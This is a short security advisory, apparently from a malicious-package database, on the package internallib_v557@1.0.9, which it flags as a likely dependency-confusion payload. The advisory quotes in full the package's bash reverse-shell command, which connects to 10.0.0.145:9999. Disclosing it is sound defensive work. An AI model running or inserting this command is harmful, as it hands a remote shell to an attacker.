summary: Reverse shell backdoor to 10.0.0.145:9999 in exported command()
details: internallib_v557@1.0.9 contains a single exported function `command()` in index.js that executes `/bin/bash -c "bash -i >& /dev/tcp/10.0.0.145/9999 0>&1" &` via child_process.exec. This is a classic interactive bash reverse shell that connects back to 10.0.0.145:9999, handing a remote shell to whoever listens on that endpoint. The package has no other functionality, no README, and bare package.json metadata (no description, author, license, or repository), and its name follows the shape of an internal-only library — consistent with a dependency-confusion payload targeting an organization's private namespace. Any installer that requires this package and invokes its only export executes the reverse shell against the hardcoded private-network IP.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
